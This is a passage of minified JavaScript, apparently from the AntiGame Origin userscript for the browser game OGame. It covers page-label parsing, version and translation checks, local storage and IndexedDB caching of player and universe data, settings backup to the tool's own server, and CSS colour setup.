d,"Labels");e.setLabel("LP07",j,"Labels");break;case "traderoverview":e.setLabel("LP08",d,"Labels");e.setLabel("LP09",j,"Labels");break;case "research":e.setLabel("LP10",d,"Labels");e.setLabel("LP11",j,"Labels");break;case "shipyard":e.setLabel("LP12",d,"Labels");break;case "defense":e.setLabel("LP14",d,"Labels");break;case "fleet1":e.setLabel("LP15",d,"Labels");e.setLabel("LP16",d+" I","Labels");e.setLabel("LP17",d+" II","Labels");e.setLabel("LP18",d+" III","Labels");e.setLabel("LP19",j,"Labels");
break;case "galaxy":e.setLabel("LP20",d,"Labels");break;case "empire":e.setLabel("LP22",d,"Labels");break;case "alliance":e.setLabel("LP24",d,"Labels"),e.setLabel("LP25",j,"Labels")}j={buddies:"LP32",notices:"LP34",highscore:"LP36",search:"LP38",preferences:"LP40"};a=document.querySelectorAll("#info #bar li > a");for(b=0;b<a.length;b++)c=r.getUrlPara("page",h.getAttribute(a[b],"href")||"X"),d=h.getText(a[b]).trim(),c&&j[c]&&e.setLabel(j[c],d,"Labels");m.setStorage("Labels",e.getDataString("Labels"))}},
loadLevels:function(a){g.ajax({url:"/game/index.php?page=resources",dataType:"html"}).done(function(b){b=g("<div>"+b+"</div>");g("#buttonz .buildingimg > a",b).each(function(){e.set("R"+this.getAttribute("ref"),n.parseInt(h.getTextFromChildnode(".level",this)),C)});g.ajax({url:"/game/index.php?page=station",dataType:"html"}).done(function(b){b=g("<div>"+b+"</div>");g("#buttonz .buildingimg > a",b).each(function(){e.set("R"+this.getAttribute("ref"),n.parseInt(h.getTextFromChildnode(".level",this)),
C)});a&&a()})})},checkResearch:function(){var a,b,c;"research"!==e.page&&m.checkUpdate("Units")?(B.updateInfo("Units",3),a=-1,b=g.ajax({url:"/game/index.php?page=research",dataType:"html"}),b.done(function(b){g("#buttonz a.detail_button",g("<div>"+b+"</div>")).each(function(){c=this.getAttribute("ref");c in f.ItemResearch&&(f.UnitsAccount[c]=+h.getTextFromChildnode(".level",this)||0)});f.UnitsAccount["100"]=A.timestamp();m.Info.Units.timestamp=f.UnitsAccount["100"];a=4;f.UnitsChanged=!0}),b.always(function(){B.updateInfo("Units",
a);e.Check()})):e.Check()},loadVersions:function(){var a,b,c,d;e.setDataString("Versions");a=A.timestamp();b=n.parseVersion("4.18.0");c=n.parseVersion(e.get("S12"));d=n.parseVersion(e.get("S13"));Ea=b<d&&c<d&&1<e.get("A41")?2:b<c&&e.is("A41")?1:0;"4.18.0"!==e.get("S11")&&e.set("S11","4.18.0");if(ja||"overview"===e.page&&a-e.get("S17")>3600*m.Info.Versions.hours)Ga=!0,e.set("S17",a);if(Ga||!J.check(e.page,"fleet1","fleet2","fleet3")&&a-e.get("S16")>3600*m.Info.Versions.hours)Ba=!0,e.set("S16",a),m.setStorage("Versions",
e.getDataString("Versions",m.Info.Versions.timestamp))},checkVersions:function(a){var b,c;if(a||m.checkUpdate("Versions"))c=e.get("S12")+e.get("S13")+e.get("S14")+e.get("S15"),b=g.ajax({url:"http://antigame.de/antigame/ago_versions.php",dataType:"text",data:{domain:e.host,lang:e.server,langmenu:e.get("A06")}}),b.done(function(b){if((b=g.parseJSON(b))&&b.current)e.set("S12",b.current),e.set("S13",b.preview),e.set("S14",b.lang),e.set("S15",b.langmenu);m.setStorage("Versions",e.getDataString("Versions"));
e.loadVersions();m.Info.Versions.status=4;a&&(c!==b.current+b.preview+b.lang+b.langmenu?O.Update():O.updateVersion());e.checkLang(a)}),b.fail(function(){m.setStorage("Versions",e.getDataString("Versions"))})},checkLang:function(a){var b,c,d,j;ja&&(c=b=!0);if(b||c)j=-1,d=g.ajax({url:m.Info.Lang.url,dataType:"text",data:{domain:e.host,lang:e.server,langmenu:e.get("A06")}}),d.done(function(a){if(a&&100<a.length){var d=a.substring(a.indexOf("{")).split('";AGO}'),f=r.trim(d[0]).substring(a.indexOf("{")).split("AGOtimeStampPlaceHolder").join(A.timestamp())+
'";AGO}',g=r.trim(d[1]).substring(a.indexOf("{"))+'";AGO}';a=r.trim(d[2]).substring(a.indexOf("{"))+'";AGO}';b&&-1<f.indexOf('{AGO:"Lang,')&&(m.setStorage("Lang",f),e.setDataString("Lang"),j=4);c&&-1<g.indexOf('{AGO:"LangMenu,')&&(m.setStorage("LangMenu",g),e.setDataString("LangMenu"),j=4);c&&-1<a.indexOf('{AGO:"LangHelp,')&&(m.setStorage("LangHelp",a),e.setDataString("LangHelp"))}}),d.always(function(){B.updateInfo("Lang",j);a&&O.Update()})}},m={Info:{Notify:{store:5,version:1,status:0},Options:{store:2,
type:9,version:3,status:0,hours:0,group:5},OptionsLive:{store:2,type:9,version:1,status:0,hours:0,group:6},Versions:{store:3,type:9,version:1,status:0,hours:1,group:7},Server:{store:3,type:9,version:3,status:0,hours:24,group:8},Labels:{store:3,type:0,version:3,status:0,hours:24,group:12},Lang:{store:2,type:0,version:2,status:0,hours:0,group:17,url:"http://antigame.de/antigame/ago4_translations.php"},LangMenu:{store:3,type:0,version:2,status:0,hours:0,group:18},LangHelp:{store:3,type:0,version:2,status:0,
hours:0,group:19},Universe:{store:0,type:9,version:1,status:0,hours:168,group:20,url:"../api/universe.xml"},Players:{store:0,type:9,version:1,status:0,hours:24,group:21,url:"../api/players.xml"},Status:{store:2,type:da,version:1,status:0},Galaxy:{store:2,type:da,version:1,status:0},GalaxyTemp:{store:3,type:da,version:1,status:0},Units:{store:3,type:12,version:1,status:0,hours:2},Planets:{store:3,type:11,version:1,status:0},InfoPanel:{store:2,type:11,version:1,status:0},Fleet_Expedition:{store:2,type:C,
version:1,status:0},Constructions:{store:3},InfoBox_Coords:{store:3},Coords_Active:{store:2},Coords:{store:3},Coords_Extern:{store:1},Coords_New:{store:1},Fleet_CountProbes:{store:2},Fleet_Task:{store:1},Fleet1_Task:{store:5},Fleet2_Task:{store:5},Fleet3_Task:{store:5},Fleet_LastTask:{store:3}},setStorage:function(a,b){var c,d;c=m.Info[a].store||3;d=m.getKeyName(a,c);window.localStorage.setItem(d,b||"");2>=c&&pa&&setTimeout(GM_setValue,0,d,b||"")},getStorage:function(a){function b(a,b){var c;pa&&
(c=GM_getValue(a))&&b&&window.localStorage.setItem(a,c);return c}var c;c=m.Info[a].store||3;a=m.getKeyName(a,c);return 1===c?window.localStorage.getItem(a)||b(a,!1)||"":2===c?window.localStorage.getItem(a)||b(a,!0)||"":3===c?window.localStorage.getItem(a)||"":5===c&&(c=window.localStorage.getItem(a))?(window.localStorage.removeItem(a,""),c):""},deleteStorage:function(a){var b;b=m.Info[a].store||3;a=m.getKeyName(a,b);window.localStorage.removeItem(a,"");2>=b&&pa&&setTimeout(GM_deleteValue,0,a)},getKeyName:function(a,
b){return 1===b?"AGO_"+a:"AGO_"+e.server+"_"+e.uni+"_"+e.playerID+"_"+a},checkTimestamp:function(a,b,c){m.Info[a].timestamp=+b||0;m.Info[a].status=0<m.Info[a].hours&&1E5>m.Info[a].timestamp?c:0<m.Info[a].hours&&A.timestamp()-m.Info[a].timestamp>3600*m.Info[a].hours?2:1},getStatusColor:function(a){a=m.Info[a]?n.d(m.Info[a].status)+2:1;return J.choose(a,q.color.textRed,q.color.textRed,q.color.textPaleRed,q.color.textGreen,q.color.textLightOrange,q.color.textDarkOrange,q.color.textLightGreen)},checkUpdate:function(a){return ja||
Ba&&(0===m.Info[a].status||3===m.Info[a].status)||Ga&&2===m.Info[a].status},valid:function(a){return a?(a+"").replace(/[\"\;]/g,"").trim():""},validObject:function(a){return a?(a+"").replace(/[\"\;\=]/g,"").trim():""},validTask:function(a){return(a+"").replace(/\"/g,"").replace(/^\;*/g,"").replace(/\;*$/g,"").trim()},splitStorageObject:function(a){var b={};a=(a||"").split(";");for(var c=0;c<a.length;c++){var d=a[c].split("=");d[0]&&(b[d[0]]=d[1]||"")}return b},joinStorageObject:function(a){var b=
[],c;for(c in a)c&&a[c]&&b.push(c+"="+(a[c]||""));return b.join(";")},setStorageObject:function(a,b,c){var d="",j,t,v,f;j=m.Info[a].store||3;t=m.Info[a].type||da;if(c)if(11<=t)for(f in b){if(b[f]&&(c=m.validObject(f))){d+=";"+c+':"';for(v in b[f])b[f][v]&&(c=m.validObject(v))&&(d+=c+"="+m.validObject(b[f][v])+";");d+='"'}}else for(f in b)b[f]&&(c=m.valid(f))&&(d+=";"+c+':"'+m.valid(b[f])+'"');else if(11<=t)for(f in b){if(b[f]){d+=";"+f+':"';for(v in b[f])b[f][v]&&(d+=v+"="+b[f][v]+";");d+='"'}}else for(f in b)b[f]&&
(d+=";"+f+':"'+b[f]+'"');m.setStorage(a,'{AGO:"'+a+",0"+(1===j?",,,":","+e.server+","+e.uni+","+e.playerID)+","+n.d(m.Info[a].version)+","+A.timestamp()+',"'+d+";AGO}")},getStorageObject:function(a,b){var c,d,j,t,f,g,h,k,l={};c=(b||m.getStorage(a)).split('";');d=c.length-2;if(0<d&&-1<c[0].indexOf('{AGO:"'+a+",")&&-1<c[c.length-1].indexOf("AGO}")){j=c[0].split(",");t=+j[1]&&+j[1]!==d||j[2]&&j[2]!==e.server||j[3]&&j[3]!==e.uni||j[4]&&j[4]!==e.playerID||+j[5]&&+j[5]!==m.Info[a].version?!1:!0;if(!t)return;
m.Info[a].timestamp=+j[6]||0;m.Info[a].status=1;t=m.Info[a].type;if(11<=t)for(h=1;h<=d;h++){if(j=c[h].split(':"'),j[0]&&(l[j[0]]={},j[1])){f=j[1].split(";");for(k=0;k<f.length;k++)g=f[k].split("="),g[0]&&(l[j[0]][g[0]]=12===t?+g[1]||0:g[1]||"")}}else for(h=1;h<=d;h++)j=c[h].split(':"'),j[0]&&(l[j[0]]=t===C?+j[1]||0:j[1]||"")}return l},setBackupString:function(a){if(a&&30<a.length){a=a.split('";AGO}');for(var b=0;b<a.length;b++)if(15<a[b].length){var c=a[b]+'";AGO}';if(-1<c.indexOf('{AGO:"Options,')){var d=
m.Info.Options.status;m.Info.Options.status=0;e.setDataString("Options",c);1<=m.Info.Options.status?(delete ia[11],m.setStorage("Options",e.getDataString("Options")),B.updateInfo("Options",4)):m.Info.Options.status=d}-1<c.indexOf('{AGO:"Status,')&&(m.Status=m.getStorageObject("Status",c),m.Info.Status.status=0,1<=m.Info.Status.status&&(m.setStorageObject("Status",m.Status,!0),B.updateInfo("Status",4)));-1<c.indexOf('{AGO:"Galaxy,')&&(m.Galaxy=m.getStorageObject("Galaxy",c),m.Info.Galaxy.status=0,
1<=m.Info.Galaxy.status&&(m.setStorageObject("Galaxy",m.Galaxy,!0),B.updateInfo("Galaxy",4)))}O.Update(1)}},setBackup:function(a){if(a&&m.Info[a]){var b=m.getStorage(a);b&&setTimeout(function(){var c=n.isMinMax(e.get("S81").length,4,30)?e.get("S81"):f.PlanetsHome.id||"default",c="user="+m.getKeyName(a,3)+"&ident="+c+"&action=put&domain="+e.host+"&string="+encodeURIComponent(b),d=new XMLHttpRequest;d.open("POST","http://usave.antigame.de/ago_backup.php",!0);d.setRequestHeader("Content-type","application/x-www-form-urlencoded");
d.setRequestHeader("Content-length",c.length);d.onload=function(){};d.send(c)},0)}},restoreBackup:function(){m.getBackup("Options")},getBackup:function(a){a&&m.Info[a]&&setTimeout(function(){B.updateInfo(a,3);var b=n.isMinMax(e.get("S81").length,4,30)?e.get("S81"):f.PlanetsHome.id||"default",b="user="+m.getKeyName(a,3)+"&ident="+b+"&action=get&domain="+e.host,c=new XMLHttpRequest;c.open("POST","http://usave.antigame.de/ago_backup.php",!0);c.setRequestHeader("Content-type","application/x-www-form-urlencoded");
c.setRequestHeader("Content-length",b.length);c.onload=function(){c.responseText&&30<c.responseText.length&&m.setBackupString(c.responseText)};c.onerror=function(){B.updateInfo(a,-1)};c.send(b)},0)},InitStatus:function(a){a&&(s.AGO_Data=a);m.Status=m.getStorageObject("Status")},saveStatus:function(){m.setStorageObject("Status",m.Status,!1)},resetStatus:function(){m.deleteStorage("Status");m.Status=m.getStorageObject("Status")},setStatus:function(a,b,c){m.Status=m.getStorageObject("Status");a&&(1<=
c&&3>=c)&&(1===c&&(a="A"+a),2===c&&(a="P"+a),20<b&&99>b?m.Status[a]=b:99===b&&delete m.Status[a]);m.saveStatus()},getStatus:function(a,b){return a?(1===b&&(a="A"+a),2===b&&(a="P"+a),n.d(m.Status[a])):0},checkHightlight:function(a,b,c){if(20<b&&99>b&&e.is("C"+b)){var d=e.getPair("H"+b),j=n.d(d[0]),d=n.d(d[1]);if(1===j||2===j&&d&&a.allianceRank&&d>=a.allianceRank||5===j&&2<=c||6===j&&d&&a.playerRank&&d>=a.playerRank||10===j&&3<=c||13===j&&n.isGreater(a.debrisMetal+a.debrisCrystal,d)||14===j&&n.isGreater(a.debrisMetal+
a.debrisCrystal,d)||15===j&&a.debrisSizeChange||16===j&&(n.isLesser(a.planetActivity,d)||n.isLesser(a.MoonActivity,d))||17===j&&(n.isLesser(a.planetActivity,d)||n.isLesser(a.MoonActivity,d))||18===j&&(a.planetActivityChange||a.moonActivityChange))return b}return 0},getTooltip:function(a,b,c,d,j,t){var f,g=[],h="";if(b&&(1===c||2===c)){e.is("T1A")&&(h+='<li><a href="'+aa.getOgniterLink(a,c)+'" target="ago_tools_T1A">Ogniter</a></li>');e.is("T1B")&&(h+='<li><a href="'+aa.getInfuzaLink(b,c)+'" target="ago_tools_T1B">Infuza</a></li>');
e.is("T1C")&&(h+='<li><a href="'+aa.getWarRidersLink(b,c)+'" target="ago_tools_T1B">WarRiders</a></li>');for(j=1;10>j;j++)if(e.is("T1"+j))(f=aa.getLink("T1"+j,c,a,b))&&(h+='<li><a href="'+f+'" target="ago_tools_T1'+j+'">'+(e.getPair("T1"+j)[0]||"")+"</a></li>");else break;h&&(h='<div class="splitLine"></div>'+h)}if(a&&e.is("CS0")){1===c?g=[42,43,44,45,46,48,49,68,69]:2===c?g=[42,43,44,45,46,48,49,61,62,63,64,65,66,67,68,69]:3===c&&(g=[61,62,63,64,65,66,67]);m.getStatus(a,c)&&g.unshift(99);g.unshift(1);
for(j=0;j<g.length;j++)1===g[j]?h+='<div class="splitLine"></div>':e.is("C"+g[j])&&(h+="<li><a href=\"javascript:AGO_Data('"+a+"',"+g[j]+","+c+');" class="'+w.classStatusColor(g[j])+'">'+e.label("C"+g[j])+"</a></li>")}a&&(e.is("D20")&&2===c)&&(h=h+'<div class="splitLine"></div>'+("<li><a href=\"javascript:AGO_Data('"+a+"',1,"+c+');">'+e.label("DT1")+"</a></li>"));return h&&d?'<div class="htmlTooltip galaxyTooltip" style="display: none;" id="'+d+'"><h1>Coords : <span>'+r.d(t)+'</span></h1><div class="splitLine"></div><ul class="ListLinks">'+
h+"</ul></div>":h},InitGalaxy:function(){e.is("D40")?(m.Galaxy=m.getStorageObject("Galaxy"),m.GalaxyTemp=m.getStorageObject("GalaxyTemp")):(m.Galaxy={},m.GalaxyTemp={})},saveGalaxy:function(){e.is("D40")&&m.Galaxy&&(m.setStorageObject("Galaxy",m.Galaxy,!1),m.Info.Galaxy.status=1)},resetGalaxy:function(){m.deleteStorage("Galaxy");m.deleteStorage("GalaxyTemp");m.Galaxy=m.getStorageObject("Galaxy");m.GalaxyTemp=m.getStorageObject("GalaxyTemp")},setGetTimestamp:function(a,b){var c=n.d(m.GalaxyTemp[a]);
m.GalaxyTemp[a]=b;return c},addGalaxy:function(a,b){if(a&&b&&b.length){var c=b.join(",");m.Galaxy[a]?(c=(c+";"+m.Galaxy[a]).split(";"),7<c.length&&(c.length=7),m.Galaxy[a]=c.join(";")):m.Galaxy[a]=c;m.Info.Galaxy.status=2}},getGalaxy:function(a){var b=m.Galaxy[a];if(b){a=[];for(var b=b.split(";"),c=0;c<b.length;c++)a.push(b[c].split(","));return a}return null},setActivityTimestamp:function(a,b,c,d){if(0<d&&60>d){var j=!1,e=n.d(m.GalaxyTemp[a]),f=b-c;m.GalaxyTemp[a]=d;var g=(m.Galaxy[a]||"").split(","),
h=n.d(g[0]),k=n.d(g[1]),g=n.d(g[2]);if(15>d){if(15<=g||b>h+900)m.addGalaxy(a,[b,0,d]),j=c?!0:!1}else h&&g<=d&&h+60*g<=b+60*d&&h>b-60-60*d?e<d&&(j=60>f&&c,(!k||f<=k)&&m.addGalaxy(a,[b,n.minMax(f,0,59),d])):(m.addGalaxy(a,[b,n.minMax(f,0,59),d]),j=c?!0:!1);return j}delete m.Galaxy["T"+a];return!1},setGalaxyDebris:function(a,b,c,d,j){var e=d||j?(d||"")+","+(j||""):"",f=m.GalaxyTemp[a]||"";e?m.GalaxyTemp[a]=e:delete m.GalaxyTemp[a];return(e||f)&&e!==f?(e=f.split(","),m.addGalaxy(a,[b,n.minMax(b-c,0,86400),
n.d(d)-n.d(e[0]),n.d(j)-n.d(e[1])]),c?!0:!1):!1}},I={Load:function(){!I.status&&e.is("D20")&&(I.indexedDB=window.indexedDB||window.webkitIndexedDB||window.mozIndexedDB,I.IDBKeyRange=window.IDBKeyRange||window.webkitIDBKeyRange,I.indexedDB&&I.IDBKeyRange&&(I.status=2))},Check:function(a,b){if(2<=I.status&&(!b||!ya))switch(b&&(ya=!0),I.checkCounter=a?1:I.checkCounter+1,I.checkCounter){case 1:I.Open("Players");break;case 2:I.checkTimestamp("Players");break;case 3:I.readPlayers();break;case 4:I.Open("Universe");
break;case 5:I.checkTimestamp("Universe");break;case 6:I.readUniverse();break;case 7:O.Update()}},checkTimestamp:function(a){var b;(1===m.Info[a].status||2===m.Info[a].status)&&(Ga||ya)?(b=new XMLHttpRequest,b.open("HEAD",m.Info[a].url,!0),b.onload=function(){var c=b.getResponseHeader("Last-Modified");m.Info[a].status=4;c&&200===+b.status&&Math.floor(m.Info[a].timestamp/100)!==Math.floor((new Date(c)).getTime()/1E5)&&(m.Info[a].status=3);I.Check()},b.send(null)):I.Check()},Open:function(a){function b(b,
j){m.Info[a].status=j;c.onerror=null;j===Z&&I.Delete(a);b&&b.close&&b.close();I.Check()}var c=I.indexedDB.open(m.getKeyName(a),3);c.onupgradeneeded=function(d){var j;d=d.target.result;c.onsuccess=null;if(ya||Ba){try{"Players"===a&&(j=d.createObjectStore("id",{keyPath:"id"}),j.createIndex("name","name",{unique:!1}),j=d.createObjectStore("info")),"Universe"===a&&(j=d.createObjectStore("iP",{keyPath:"iP"}),j.createIndex("id","id",{unique:!1}),j.createIndex("cP","cP",{unique:!1}),d.createObjectStore("info"))}catch(e){b(d,
Z);return}b(d,3)}else b(d,Z)};c.onerror=function(a){ia[5]=!0;B.updateInfo("Notify");b(a.target.result,Z)};c.onblocked=function(a){b(a.target.result,-1)};c.onsuccess=function(c){var j=c.target.result;try{var e=j.transaction("info").objectStore("info").get("timestampServer");e.onerror=function(){b(j,Z)};e.onsuccess=function(c){m.checkTimestamp(a,c.target.result,Z);b(j,m.Info[a].status)}}catch(f){b(j,Z)}}},readPlayers:function(){function a(b,c,e,f){var g;e<c.length?(g="- "+c[e],g={id:n.d((g.split(' id="')[1]||
"").split('"')[0]),iA:n.d((g.split(' alliance="')[1]||"").split('"')[0]),name:(g.split(' name="')[1]||"").split('"')[0],status:(g.split(' status="')[1]||"").split('"')[0]},0===e%f&&B.updateInfo("Players",Math.ceil(e/f),!0),g=b.add(g),g.onsuccess=function(){a(b,c,e+1,f)}):c=null}function b(a,b){b===Z&&I.Delete("Players");a&&a.close&&a.close();B.updateInfo("Players",b);I.Check()}var c;3===m.Info.Players.status&&(Ba||ya)?(B.updateInfo("Players",3),c=g.ajax({url:m.Info.Players.url,dataType:"text",cache:!1}),
c.fail(function(){b(null,-1)}),c.done(function(c){var j,e;j=c.split("<player ");e=Math.ceil(j.length/100);c=I.indexedDB.open(m.getKeyName("Players"));c.onerror=function(a){b(a.target.result,Z)};c.onblocked=function(a){b(a.target.result,-1)};c.onsuccess=function(c){var d,f,g;try{d=c.target.result,d.transaction("info","readwrite").objectStore("info").put(0,"timestampServer"),f=d.transaction(["id"],"readwrite"),g=f.objectStore("id"),g.clear()}catch(h){b(d,Z);return}f.onabort=function(){b(d,Z)};f.ontimeout=
function(){b(d,Z)};f.oncomplete=function(){m.Info.Players.timestamp=n.d(((j[0]||"").split(' timestamp="')[1]||"").split('"')[0]);d.transaction("info","readwrite").objectStore("info").put(m.Info.Players.timestamp,"timestampServer");b(d,4)};a(g,j,1,e)}})):I.Check()},readUniverse:function(){function a(b,c,e,f){var g,h;e<c.length?(g=c[e].split("<moon "),h="- "+g[0],h={iP:n.d((h.split(' id="')[1]||"").split('"')[0]),id:n.d((h.split(' player="')[1]||"").split('"')[0]),nP:(h.split(' name="')[1]||"").split('"')[0],
cP:(h.split(' coords="')[1]||"").split('"')[0]},g[1]&&(g="- "+g[1],h.iM=n.d((g.split(' id="')[1]||"").split('"')[0]),h.nM=(g.split(' name="')[1]||"").split('"')[0]),0===e%f&&B.updateInfo("Universe",Math.ceil(e/f),!0),g=b.add(h),g.onsuccess=function(){a(b,c,e+1,f)}):c=null}function b(a,b){b===Z&&I.Delete("Universe");a&&a.close&&a.close();B.updateInfo("Universe",b);I.Check()}var c;3===m.Info.Universe.status&&(Ba||ya)?(B.updateInfo("Universe",3),c=g.ajax({url:m.Info.Universe.url,dataType:"text",cache:!1}),
c.fail(function(){b(null,-1)}),c.done(function(c){var j,e;j=c.split("<planet ");e=Math.ceil(j.length/100);c=I.indexedDB.open(m.getKeyName("Universe"));c.onerror=function(a){b(a.target.result,Z)};c.onblocked=function(a){b(a.target.result,-1)};c.onsuccess=function(c){var d,f,g;try{d=c.target.result,d.transaction("info","readwrite").objectStore("info").put(0,"timestampServer"),f=d.transaction(["iP"],"readwrite"),g=f.objectStore("iP"),g.clear()}catch(h){b(d,Z);return}f.onabort=function(){b(d,Z)};f.ontimeout=
function(){b(d,Z)};f.oncomplete=function(){m.Info.Universe.timestamp=n.d(((j[0]||"").split(' timestamp="')[1]||"").split('"')[0]);d.transaction("info","readwrite").objectStore("info").put(m.Info.Universe.timestamp,"timestampServer");b(d,4)};a(g,j,1,e)}})):I.Check()},Delete:function(a){setTimeout(function(){I.indexedDB.deleteDatabase(m.getKeyName(a))},777)},ObjectStore:function(a,b,c,d){2<=I.status&&d&&(a=I.indexedDB.open(m.getKeyName(a)),a.onerror=function(){I.status=-1},a.onsuccess=function(a){var e,
f;try{e=a.target.result,f=e.transaction(b,c||"readonly"),f.oncomplete=function(){e.close()},f.onerror=function(){e.close()},f.onabort=function(){e.close()},f.ontimeout=function(){e.close()},d(f.objectStore(b))}catch(g){e.close()}})},getPlayerById:function(a,b){a&&b&&I.ObjectStore("Players","id","readonly",function(c){c&&(c.get(n.d(a)).onsuccess=function(a){b(a.target.result||{})})})},getUniverseByCoord:function(a,b){a&&b&&I.ObjectStore("Universe","iP","readonly",function(c){c&&(c.index("cP").get(a).onsuccess=
function(a){b(a.target.result||{})})})},getUniverseByPlayerId:function(a,b){(a=n.d(a))&&b&&I.ObjectStore("Universe","iP","readonly",function(c){if(c){var d=I.IDBKeyRange.only(a),e=[];c.index("id").openCursor(d).onsuccess=function(a){(a=a.target.result)?(e[e.length]=a.value,a["continue"]()):b(e)}}})}},q={color:{activeGreen:"#99CC00",textBlue:"#6F9FC8",textBlueGrey:"#8C9EAA",textBlueNote:"#3344CC",textWhite:"#FFFFFF",textBrighter:"#EFEBE2",textBright:"#CFCBC2",textLight:"#A1A1A1",textNormal:"#848484",
textMenu:"#767F88",textMenuInactive:"#343739",textOrange:"#FF9600",textLightOrange:"#FFB500",textDarkOrange:"#FF4B00",textDarkerOrange:"#A26D00",textGreen:"#008000",textLightGreen:"#00B000",textLimeGreen:"#99CC00",textRed:"#FF0000",textPaleRed:"#D43635",textLimeOrange:"#FD8A1C",textHonorable:"#FFFF66",textActive:"#FFFFFF",textInactive:"#6E6E6E",backMenu:"#0D1014",backGreen:"#274650",backGray:"#696969",iconOrange:"#D69B50"},image:{ShipsMost:"data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEASABIAAD/2wBDAAQDAwMDAgQDAwMEBAQFBgoGBgUFBgwICQcKDgwPDg4MDQ0PERYTDxAVEQ0NExoTFRcYGRkZDxIbHRsYHRYYGRj/2wBDAQQEBAYFBgsGBgsYEA0QGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBgYGBj/wAARCABAACADASIAAhEBAxEB/8QAGQABAQEBAQEAAAAAAAAAAAAABgcIBAUD/8QAOBAAAQIFAgMEBwYHAAAAAAAAAQIDBAUGBxEAIRIxQRMUMmEVFzRRorLRFjVykZShQlJWscHS4f/EABgBAQADAQAAAAAAAAAAAAAAAAMEBQcC/8QAIhEBAAEEAwADAAMAAAAAAAAAAQIDBBEhABIxBRNBI2Fx/9oADAMBAAIRAxEAPwAHQFtqIirYSGLiqal0Q+/BNPOOvMhalKUkEkk+Z0yl1laanHa+iLdw8f2WO07pLu14M5xnhScZwfyOvjbfBtDTWCPu5j5BqnUPWMfRVUNzKFUpyGXhEVDZ2eR/sOYPQ+RIOVFXtcYrTkRXbl5rkLOBZxlRpRZdTAhvXJT6r6B/pKU/pk/TRa4tt6KgrWzyNhKbl8O+xCLdbdZaCFJUkZBBHmNauulR8A7BNXCpQpdk8fhcQlsbMuKOOLHQE7EHkrbrgZ+ucQLOVLuPu90fDpKlOva3MYSm+iOXCficIjaXVlOrCmGnJgyIbH+znnUBCFVq6dWBsZeyfgGnFN0nNapqWFkkqZ4331YKz4Wk/wAS1HokDf8AYZJA1P7bXCt9C2kp+Ej6rlkPFMQaGnWXneBSFJGCCDqhU/fWk6Udfdp+4Ulg3HwEuKy04SBkgArScDfpz29w1UyoyLuX305dOznBv38841L5iMbOMaM49+oGXWcfvKpdCaSaj6BYtHTAD+OF2ZRKtzxBQWB+IqSFH+UADrtmy4zCmrT1AsjbuTny6SOXMt1ERzkVEVxKnXXFFbji4kFSlHcknqSdE7o3At/G2insJL6qlkTFPQqm2mWXeNS1HYAAakTrXF3e05/UkRAMOgdHI8Lq2tbKpRKhKUiSuTLJNvPdoi19Fv26ksTE03L333oRt1x15oLUpSkgkknzOlkBZSmJp2no2gYWN7PHH3aA7TgznGeEbZwfyOu+hcerOQ4I9ha+UafUlU8ZStQIjoclbCsJiGM7Oo+o5g/4JGrke1b+WaC73yNChEtYypU4ssHob1yTG1VCc/snKf0yfpo3XlsKMhrbziJhKcl7D7MMpxt1loIUlQGQQR5jWo7hUxBOQrda06UuSyMwt4IGza1HxeQJ2I6K264EYr8J9WE9yR7G4P213OjVt65Bk+mHLs/HhjbXFrKpCAac6Mjjx/znBRjHFbuSLA2ME0fhGlsipyYVFPoeUy5riedVuo+FtPVSj0AH/N8am1v7k0Gxa+Rw8dVMth4lqEQ26y64EqQoDBBB04kl86Tpxx5yTV3J4ZbwCXFZbWSBnAyoHHPpz29w1WsUuX7oS65c4N+8Sn8iFrGNKUe2DGXXnKvcCYyumKOatrIAHvC5Hvq3PECF4/ESAT7gAOu0Irlot24nSjy7o5/bXU7dK3z0UuIerSVuOuKK1rXEAlSjuSTovcS5NCxNr5zDwVUS+IiXIZSGmmXOJS1HYAAaaVxWubqEvrQEAw6M6OFGrQt7SdMmKirn1Tbz/9k%3D"},
cache:"",set:function(a){a&&0<a.length&&q.Sheet.appendChild(document.createTextNode(("string"===typeof a?a:a.join("\n"))+"\n"))},setCache:function(a,b){a&&0<a.length&&(q.cache+=("string"===typeof a?a:a.join("\n"))+"\n",b&&q.insertCache())},insertCache:function(){var a;q.cache&&(a=document.createElement("style"),a.media="screen",a.type="text/css",a.setAttribute("rel","stylesheet"),a.textContent=q.cache,document.getElementsByTagName("head")[0].appendChild(a));q.cache=""},maxWidth:function(a,b){return a?
Math.max(Math.min(a,s.innerWidth-n.d(b)),0):s.innerWidth},maxHeight:function(a,b){return a?Math.max(Math.min(a,s.innerHeight-n.d(b)),0):s.innerHeight},Load:function(){la&&(!Za&&F.ogame)&&(document.documentElement.style.overflowY="scroll");document.body.className+=e.type===Y?" ago_moon":" ago_planet";if(e.is("CM0")&&(q.setCache([".ownattack { color: "+e.get("E51")+" !important; }",".ownfederation { color: "+e.get("E52")+" !important; }",".owntransport { color: "+e.get("E53")+" !important; }",".owndeploy { color: "+
e.get("E54")+" !important; }",".ownhold { color: "+e.get("E55")+" !important; }",".ownespionage { color: "+e.get("E56")+" !important; }",".owncolony { color: "+e.get("E57")+" !important; }",".ownharvest { color: "+e.get("E58")+" !important; }",".owndestroy { color: "+e.get("E59")+" !important; }",".ownexpedition { color: "+e.get("E65")+" !important; }"]),n.isMinMax(e.get("CM3",100),1,99))){var a=qa?" td":"";q.setCache(["#eventContent .ago_events_reverse"+a+", #eventContent .ago_events_reverse + .ago_eventlist"+
a+", #inhalt div.fleetDetails[ago_events_reverse] > span { opacity: "+n.minMax(e.get("CM3",100),10,100)/100+" !important; }"])}q.setCache([".text_blue { color: "+q.color.textBlue+" !important; }",".text_bluenote { color: "+q.color.textBlueNote+" !important; }",".text_green { color: "+q.color.textGreen+" !important; }",".text_lightgreen { color: "+q.color.textLightGreen+" !important; }",".text_limegreen { color: "+q.color.textLimeGreen+" !important; }",".text_orange { color: "+q.color.textOrange+" !important; }",
".text_red { color: "+q.color.textRed+" !important; }",".text_palered { color: "+q.color.textPaleRed+" !important; }",".text_active { color: "+q.color.textActive+" !important; }",".text_inactive { color: "+q.color.textInactive+" !important; }","table, tr, td { color: inherit; }",".ago_color_normal { color: "+q.color.textNormal+"; }",".ago_color_blue { color: "+q.color.textBlue+"; }",".ago_color_bluenote { color: "+q.color.textBlueNote+"; }",".ago_color_current { color: "+(e.type===Y?q.color.textLimeOrange:
